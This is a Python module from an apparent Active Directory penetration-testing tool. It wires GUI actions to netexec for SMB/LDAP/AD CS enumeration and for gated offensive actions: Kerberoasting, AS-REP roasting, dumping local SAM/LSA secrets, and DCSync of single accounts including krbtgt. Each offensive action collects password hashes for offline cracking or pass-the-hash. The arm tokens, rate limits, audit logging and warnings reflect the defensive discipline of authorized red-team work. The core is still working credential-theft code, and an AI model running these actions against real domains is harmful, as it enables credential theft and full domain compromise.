"""On-demand actions - run a single engine against one target (right-click in the GUI).

Phase 2: **read-only enumeration** actions only. Each action reuses an existing engine
against the clicked node's target and streams results to the live graph via the EventBus,
exactly like a scan does. The plumbing (token-gated POST /action -> here) is the same
channel every future action uses.

Phase 3 (offensive: Kerberoast / secretsdump / pass-the-hash / DCSync / ADCS abuse) will
register here with `offensive=True` and its own confirmation gating - see docs/GUI.md.
Those engines are anjaiv's area; agree each action's params + Finding first.
"""
from __future__ import annotations

import glob
import json
import os
import re
import secrets
import tempfile
import time
from dataclasses import dataclass
from typing import Callable, Optional

from .engines import CertipyEngine, LdapEngine, NetExecEngine, TLSEngine
from .engines.base import Engine, Target
from .engines.ldap import parse_asrep, parse_kerberoast
from .events import Event, EventBus, EventKind
from .findings import Category, Evidence, Finding, Report, Severity
from .scan import _emit_finding_graph


@dataclass(frozen=True)
class Action:
    id: str
    label: str
    node_types: tuple[str, ...]          # which graph node types this applies to
    engine: Optional[Callable[[], Engine]] = None   # read-only actions: a fresh engine per run
    offensive: bool = False              # Phase 3: gated, armed channel only
    handler: Optional[Callable[..., list]] = None   # offensive actions: (target, tgt, *, bus, runner) -> [Finding]
    warn: Optional[Callable[[str], str]] = None     # target-specific danger line for the arm banner


# Read-only enumeration actions. `engine` is a factory so each run gets a fresh instance.
ACTIONS: dict[str, Action] = {
    "enum-smb":  Action("enum-smb",  "Enumerate SMB (shares / signing / null)", ("host", "domain"), NetExecEngine),
    "enum-ldap": Action("enum-ldap", "Enumerate LDAP (users / roastable)",      ("host", "domain"), LdapEngine),
    "enum-adcs": Action("enum-adcs", "Enumerate AD CS (ESC)",                    ("host", "domain"), CertipyEngine),
    "enum-tls":  Action("enum-tls",  "Check TLS",                               ("host", "domain"), TLSEngine),
}


def catalog() -> list[dict]:
    """Serializable action list so the GUI can build per-node-type context menus."""
    return [{"id": a.id, "label": a.label, "node_types": list(a.node_types),
             "offensive": a.offensive} for a in ACTIONS.values()]


def actions_for(node_type: str) -> list[Action]:
    return [a for a in ACTIONS.values() if node_type in a.node_types]


def _emit(bus: Optional[EventBus], kind: EventKind, engine: str = "action", **data) -> None:
    if bus is not None:
        bus.publish(Event(kind=kind, data=data, engine=engine))


def run_action(action_id: str, target: str, *, username: Optional[str] = None,
               password: Optional[str] = None, domain: Optional[str] = None,
               bus: Optional[EventBus] = None) -> Report:
    """Run one action against `target`, streaming to `bus`. Returns a Report."""
    report = Report(engagement=f"action:{action_id}", target=target)
    a = ACTIONS.get(action_id)
    if a is None:
        _emit(bus, EventKind.STATUS, message=f"unknown action: {action_id}")
        return report
    if a.offensive or a.engine is None:
        # offensive actions never run through the un-gated read-only path
        _emit(bus, EventKind.STATUS,
              message=f"refused: {action_id} is an offensive action - use the armed channel")
        return report

    eng = a.engine()
    _emit(bus, EventKind.NODE, id=target, label=target, type="host")
    _emit(bus, EventKind.STATUS, engine=eng.name, message=f"{a.label} on {target}")
    _emit(bus, EventKind.PROBE, engine=eng.name, target=target, test=action_id)
    if not eng.is_available():
        _emit(bus, EventKind.STATUS, engine=eng.name, message=f"{eng.name}: not installed - skipping")
        _emit(bus, EventKind.DONE, engine=eng.name)
        return report

    tgt = Target(host=target, username=username, password=password, domain=domain)
    try:
        findings = eng.run(tgt)
    except Exception as e:                # a broken action must not take down the server
        _emit(bus, EventKind.STATUS, engine=eng.name, message=f"{eng.name}: error on {target}: {e}")
        findings = []
    report.findings = findings
    for f in findings:
        _emit_finding_graph(bus, domain or target, target, f)
    _emit(bus, EventKind.STATUS, engine=eng.name, message=f"{a.label}: {len(findings)} finding(s)")
    _emit(bus, EventKind.DONE, engine=eng.name)
    return report


# =========================================================================== #
# Phase 3 - offensive actions: arm/execute gating (docs/GUI.md, issue #49)      #
#                                                                               #
# Offensive actions never run through run_action. The GUI must first ARM the    #
# action (POST /action/arm -> arm_token) then EXECUTE with that token + a typed #
# X-Redness-Confirm header (the web-native equivalent of poison/spray's typed   #
# YES/FORCE, since a POST has no TTY). Arming is rate-limited and every arm /    #
# execute / refusal is audited. This module holds the pure logic; the two       #
# bridge endpoints are Gjoko's live/ follow-up.                                 #
# =========================================================================== #
ARM_TTL = 120.0                  # seconds an arm_token stays valid
ARM_RATE_MAX = 5                 # max arm requests ...
ARM_RATE_WINDOW = 300.0          # ... per this many seconds (5 min); 6th within the window is refused
AUDIT_PATH = os.path.join("loot", "offensive-audit.log")


class ArmError(Exception):
    """Arming refused (unknown/non-offensive action, or rate-limited)."""


@dataclass
class _ArmRecord:
    action: str
    target: str
    expires_at: float            # time.monotonic() deadline
    used: bool = False


_ARM: dict[str, _ArmRecord] = {}
_ARM_TIMES: list[float] = []     # recent arm timestamps, for rate limiting


def _default_audit(rec: dict) -> None:
    try:
        os.makedirs(os.path.dirname(AUDIT_PATH) or ".", exist_ok=True)
        with open(AUDIT_PATH, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(rec) + "\n")
    except OSError:
        pass


def _audit(sink: Optional[Callable[[dict], None]], event: str, **fields) -> None:
    rec = {"ts": time.time(), "event": event, **fields}
    (sink or _default_audit)(rec)


def arm(action_id: str, target: str, *, now: Optional[float] = None,
        audit: Optional[Callable[[dict], None]] = None) -> dict:
    """Issue a single-use arm_token for an offensive action against `target`.

    Rate-limited (ARM_RATE_MAX per ARM_RATE_WINDOW) and audited. Raises ArmError for a
    non-offensive/unknown action or when rate-limited.
    """
    now = time.monotonic() if now is None else now
    a = ACTIONS.get(action_id)
    if a is None or not a.offensive:
        raise ArmError(f"not an offensive action: {action_id}")
    global _ARM_TIMES
    _ARM_TIMES = [t for t in _ARM_TIMES if now - t < ARM_RATE_WINDOW]
    if len(_ARM_TIMES) >= ARM_RATE_MAX:
        _audit(audit, "arm-refused", action=action_id, target=target, reason="rate-limited")
        raise ArmError("rate limited: too many arm requests")
    _ARM_TIMES.append(now)
    token = secrets.token_urlsafe(24)
    _ARM[token] = _ArmRecord(action=action_id, target=target, expires_at=now + ARM_TTL)
    _audit(audit, "arm", action=action_id, target=target)
    return {"arm_token": token, "expires_in": ARM_TTL, "banner": _arm_banner(a, target)}


def _arm_banner(a: Action, target: str) -> str:
    warn = (a.warn(target) + " ") if a.warn else "This actively attacks the target. "
    return (f"OFFENSIVE ACTION: {a.label} against '{target}'. {warn}Authorized, in-scope "
            f"engagements only. Confirm by sending header X-Redness-Confirm: {a.id}")


def _consume_arm(arm_token: str, action_id: str, target: str, confirm: str,
                 *, now: Optional[float] = None) -> bool:
    """True (and consume the single-use token) iff it is valid, unexpired, matches the
    action+target, and `confirm` equals the action id."""
    now = time.monotonic() if now is None else now
    rec = _ARM.get(arm_token)
    if rec is None or rec.used or now > rec.expires_at:
        return False
    if rec.action != action_id or rec.target != target or confirm != action_id:
        return False
    rec.used = True
    return True


def _principal(name: str) -> str:
    """Canonical account key: strip DOMAIN\\ / @domain, lowercase (see docs/DECISIONS BH key)."""
    return name.split("\\")[-1].split("@")[0].lower()


def _default_kerberoast_run(tgt: Target) -> str:
    """Roast via `nxc ldap --kerberoasting`, reusing LdapEngine's invocation + nxc's hash file."""
    eng = LdapEngine()
    if not eng.is_available():
        return ""
    with tempfile.TemporaryDirectory() as td:
        out = os.path.join(td, "tgs.txt")
        raw = eng._invoke(["--kerberoasting", out], tgt)
        for f in glob.glob(os.path.join(td, "*.txt")):
            try:
                with open(f, encoding="utf-8", errors="replace") as fh:
                    raw += "\n" + fh.read()
            except OSError:
                pass
    return raw


def _kerberoast_user(target: str, tgt: Target, *, bus: Optional[EventBus] = None,
                     runner: Optional[Callable[[Target], str]] = None) -> list[Finding]:
    """Kerberoast one principal: request its TGS, keep only that account's krb5tgs hash.

    Reuses ldap.parse_kerberoast; the hash rides in meta["hashes"] for the crack pipeline.
    """
    raw = (runner or _default_kerberoast_run)(tgt)
    pairs = [(a, h) for a, h in parse_kerberoast(raw) if _principal(a) == _principal(target)]
    if not pairs:
        return []
    return [Finding(
        id="kerberoast-user",
        title=f"Kerberoasted {target}",
        severity=Severity.HIGH,
        category=Category.KERBEROS,
        description=f"Requested a service ticket (TGS) for '{target}' and captured its "
                    f"krb5tgs hash for offline cracking.",
        impact="The service account's password hash can be cracked offline; a recovered "
               "password is a valid domain credential.",
        remediation="Use a 25+ character / gMSA service-account password; monitor for "
                    "anomalous TGS requests (many SPNs from one principal).",
        affected=[target],
        evidence=[Evidence(source="netexec-ldap",
                           detail=f"{len(pairs)} krb5tgs hash(es) for {target}")],
        references=["https://attack.mitre.org/techniques/T1558/003/"],
        credentialed=True,
        meta={"offensive": True, "action": "kerberoast-user",
              "hashes": [{"account": a, "hash": h, "type": "krb5tgs"} for a, h in pairs]},
    )]


def execute_armed_action(action_id: str, target: str, tgt: Target, *,
                         arm_token: str, confirm: str, bus: Optional[EventBus] = None,
                         audit: Optional[Callable[[dict], None]] = None,
                         runner: Optional[Callable] = None) -> Report:
    """Run an offensive action, but only against a valid arm_token + confirmation.

    `tgt` carries the connection + credentials (host/domain/username/password/nthash), like
    poison/spray. Findings are marked meta["offensive"]=True. Every path is audited.
    """
    report = Report(engagement=f"action:{action_id}", target=target)
    a = ACTIONS.get(action_id)
    if a is None or not a.offensive or a.handler is None:
        _audit(audit, "refuse", action=action_id, target=target, reason="unknown-or-not-offensive")
        _emit(bus, EventKind.STATUS, message=f"refused: {action_id} is not an offensive action")
        return report
    if not _consume_arm(arm_token, action_id, target, confirm):
        _audit(audit, "refuse", action=action_id, target=target, reason="not-armed-or-bad-confirm")
        _emit(bus, EventKind.STATUS, message=f"refused: {a.label} not armed / bad confirmation")
        return report

    _audit(audit, "execute", action=action_id, target=target, host=tgt.host, user=tgt.username)
    _emit(bus, EventKind.NODE, id=target, label=target, type="user")
    _emit(bus, EventKind.STATUS, message=f"{a.label} on {target} (armed)")
    try:
        findings = a.handler(target, tgt, bus=bus, runner=runner)
    except Exception as e:                # a broken action must not take down the server
        _emit(bus, EventKind.STATUS, message=f"{a.label}: error on {target}: {e}")
        findings = []
    for f in findings:
        f.meta.setdefault("offensive", True)     # marker enforced even if a handler forgets
        f.meta.setdefault("action", action_id)
        _emit_finding_graph(bus, tgt.domain or tgt.host, target, f)
    report.findings = findings
    _audit(audit, "result", action=action_id, target=target, findings=len(findings))
    _emit(bus, EventKind.STATUS, message=f"{a.label}: {len(findings)} finding(s)")
    _emit(bus, EventKind.DONE, engine="action")
    return report


# Register the first offensive action (gated; never in the read-only catalog path).
ACTIONS["kerberoast-user"] = Action(
    "kerberoast-user", "Kerberoast this account", ("user",),
    offensive=True, handler=_kerberoast_user)


# --------------------------------------------------------------------------- #
# AS-REP roast one principal (sibling of kerberoast; needs no credentials)      #
# --------------------------------------------------------------------------- #
def _default_asrep_run(tgt: Target) -> str:
    """AS-REP roast via `nxc ldap --asreproast`, reusing LdapEngine's invocation + nxc's hash file.

    VERIFY on Kali: unlike Kerberoast, AS-REP roasting a KNOWN account can succeed
    unauthenticated - this runs with whatever creds `tgt` carries (possibly none); confirm the
    `--asreproast` behavior with empty creds against real nxc.
    """
    eng = LdapEngine()
    if not eng.is_available():
        return ""
    with tempfile.TemporaryDirectory() as td:
        out = os.path.join(td, "asrep.txt")
        raw = eng._invoke(["--asreproast", out], tgt)
        for f in glob.glob(os.path.join(td, "*.txt")):
            try:
                with open(f, encoding="utf-8", errors="replace") as fh:
                    raw += "\n" + fh.read()
            except OSError:
                pass
    return raw


def _asrep_warn(target: str) -> str:
    return (f"Requests the AS-REP hash for '{target}' for offline cracking. Low intrusiveness and "
            f"needs no credentials; a recovered password is a valid domain credential.")


def _asrep_roast(target: str, tgt: Target, *, bus: Optional[EventBus] = None,
                 runner: Optional[Callable[[Target], str]] = None) -> list[Finding]:
    """AS-REP roast one principal: capture its krb5asrep hash for offline cracking.

    Reuses ldap.parse_asrep; the hash rides in meta["hashes"] for the crack pipeline. The roast
    runs LIVE here at execution time (no cached scan result) for fresh accuracy.
    """
    raw = (runner or _default_asrep_run)(tgt)
    pairs = [(a, h) for a, h in parse_asrep(raw) if _principal(a) == _principal(target)]
    if not pairs:
        return []
    return [Finding(
        id="asrep-roast-user",
        title=f"AS-REP roasted {target}",
        severity=Severity.HIGH,
        category=Category.KERBEROS,
        description=f"Captured the AS-REP hash for '{target}' (Kerberos pre-authentication "
                    f"disabled) for offline cracking.",
        impact="The AS-REP hash can be cracked offline with no credentials; a recovered password "
               "is a valid domain credential.",
        remediation="Enable Kerberos pre-authentication for the account; enforce a strong, long "
                    "password.",
        affected=[target],
        evidence=[Evidence(source="netexec-ldap",
                           detail=f"{len(pairs)} krb5asrep hash(es) for {target}")],
        references=["https://attack.mitre.org/techniques/T1558/004/"],
        credentialed=False,
        meta={"offensive": True, "action": "asrep-roast",
              "hashes": [{"account": a, "hash": h, "type": "krb5asrep"} for a, h in pairs]},
    )]


ACTIONS["asrep-roast"] = Action(
    "asrep-roast", "AS-REP roast this account", ("user",),
    offensive=True, handler=_asrep_roast, warn=_asrep_warn)


# --------------------------------------------------------------------------- #
# secretsdump (local SAM/LSA) + DCSync (one principal via DRSUAPI)              #
# --------------------------------------------------------------------------- #
# secretsdump / SAM / NTDS lines share one format: `account:rid:LM:NT:::`.
_SECRET_LINE = re.compile(
    r"(?P<acct>[^\s:]+):(?P<rid>\d+):[0-9a-fA-F]{32}:(?P<nt>[0-9a-fA-F]{32}):::")
_EMPTY_NT = "31d6cfe0d16ae931b73c59d7e0c089c0"    # NT hash of a blank password - not a credential


def parse_secretsdump(raw: str) -> list[tuple[str, str, str]]:
    """Parse `account:rid:LM:NT:::` lines into (account, rid, nthash); dedupe, drop blanks."""
    out: list[tuple[str, str, str]] = []
    seen: set[str] = set()
    for m in _SECRET_LINE.finditer(raw):
        acct, nt = m.group("acct"), m.group("nt").lower()
        if acct in seen or nt == _EMPTY_NT:
            continue
        seen.add(acct)
        out.append((acct, m.group("rid"), nt))
    return out


def _is_privileged(account: str, rid: str) -> bool:
    # detectable-privileged only: krbtgt (RID 502) + builtin Administrator (RID 500).
    # Broader Domain Admins membership needs enumeration/BloodHound - out of scope here.
    return account.split("\\")[-1].lower() == "krbtgt" or rid in ("500", "502")


def _default_secretsdump_run(tgt: Target) -> str:
    """`nxc smb <host> --sam --lsa` (local secrets on one host), reusing NetExecEngine."""
    eng = NetExecEngine()
    return eng._invoke(["--sam", "--lsa"], tgt) if eng.is_available() else ""


def _default_dcsync_run(target: str, tgt: Target) -> str:
    """DCSync ONE principal via nxc's DRSUAPI module (`-o USER=<account>`).

    NOTE: the exact nxc module/flag could not be introspected offline - verify against real
    nxc on a DC and adjust if needed (the parser is format-based, so it is unaffected).
    """
    eng = NetExecEngine()
    return eng._invoke(["-M", "drsuapi", "-o", f"USER={target}"], tgt) if eng.is_available() else ""


def _secretsdump_warn(host: str) -> str:
    return (f"Dumps local SAM account hashes + LSA secrets from {host} (this one host). Requires "
            f"local admin on the host; may trigger EDR there.")


def _dcsync_warn(target: str) -> str:
    if target.split("\\")[-1].lower() == "krbtgt":
        return ("Replicates the password hash for krbtgt via DRSUAPI - this enables Golden Ticket "
                "forgery, full and persistent domain compromise. Extremely loud; will almost "
                "certainly trigger SOC/EDR detection.")
    return (f"Replicates the password hash for '{target}' via DRSUAPI (DCSync). Loud; may trigger "
            f"SOC/EDR detection.")


def _secretsdump_target(target: str, tgt: Target, *, bus: Optional[EventBus] = None,
                        runner: Optional[Callable[[Target], str]] = None) -> list[Finding]:
    creds = parse_secretsdump((runner or _default_secretsdump_run)(tgt))
    if not creds:
        return []
    return [Finding(
        id="secretsdump-target",
        title=f"Local secrets dumped from {target}",
        severity=Severity.CRITICAL,
        category=Category.SECRET,
        description=f"Dumped local SAM account hashes and LSA secrets from {target}.",
        impact="Local account NT hashes enable pass-the-hash; a reused local-admin password moves "
               "laterally across every host that shares it.",
        remediation="Rotate local admin passwords (LAPS for unique per-host passwords); restrict "
                    "local admin rights; monitor for remote SAM/LSA access.",
        affected=[target],
        evidence=[Evidence(source="netexec", detail=f"{len(creds)} local hash(es) from {target}")],
        references=["https://attack.mitre.org/techniques/T1003/002/",
                    "https://attack.mitre.org/techniques/T1003/004/"],
        credentialed=True,
        meta={"offensive": True, "action": "secretsdump-target",
              "credentials": [{"account": a, "kind": "nthash", "secret": nt, "source": "secretsdump"}
                              for a, _rid, nt in creds]},
    )]


def _dcsync_user(target: str, tgt: Target, *, bus: Optional[EventBus] = None,
                 runner: Optional[Callable[[str, Target], str]] = None) -> list[Finding]:
    raw = (runner or _default_dcsync_run)(target, tgt)
    hit = next(((a, r, nt) for a, r, nt in parse_secretsdump(raw)
                if _principal(a) == _principal(target)), None)
    if hit is None:
        return []
    account, rid, nt = hit
    is_krbtgt = account.split("\\")[-1].lower() == "krbtgt"
    priv = _is_privileged(account, rid)
    if is_krbtgt:
        impact = ("The krbtgt hash enables Golden Ticket forgery - arbitrary Kerberos tickets for "
                  "any principal, i.e. full and persistent domain compromise until krbtgt is "
                  "reset twice.")
    elif priv:
        impact = ("This is a privileged account; its NT hash enables pass-the-hash to privileged "
                  "access across the domain.")
    else:
        impact = "The NT hash enables pass-the-hash authentication as this account."
    return [Finding(
        id="dcsync-user",
        title=f"DCSync recovered hash for {target}",
        severity=Severity.CRITICAL if priv else Severity.HIGH,
        category=Category.SECRET,
        description=f"Replicated the password hash for '{target}' from the domain controller via "
                    f"DRSUAPI (DCSync).",
        impact=impact,
        remediation="Reset the account password" + (" twice (krbtgt)" if is_krbtgt else "") +
                    "; restrict directory-replication rights (DS-Replication-Get-Changes*) to "
                    "domain controllers; monitor for DRSUAPI replication from non-DC hosts.",
        affected=[target],
        evidence=[Evidence(source="netexec", detail=f"{target} NT:{nt}")],
        references=["https://attack.mitre.org/techniques/T1003/006/"],
        credentialed=True,
        meta={"offensive": True, "action": "dcsync-user",
              "credentials": [{"account": target, "kind": "nthash", "secret": nt,
                               "source": "dcsync"}]},
    )]


ACTIONS["secretsdump-target"] = Action(
    "secretsdump-target", "Dump local secrets (SAM/LSA)", ("host",),
    offensive=True, handler=_secretsdump_target, warn=_secretsdump_warn)
ACTIONS["dcsync-user"] = Action(
    "dcsync-user", "DCSync this account", ("user",),
    offensive=True, handler=_dcsync_user, warn=_dcsync_warn)
# Deferred: a domain-wide `dcsync` (all accounts via -just-dc / full --ntds) - out of scope now.
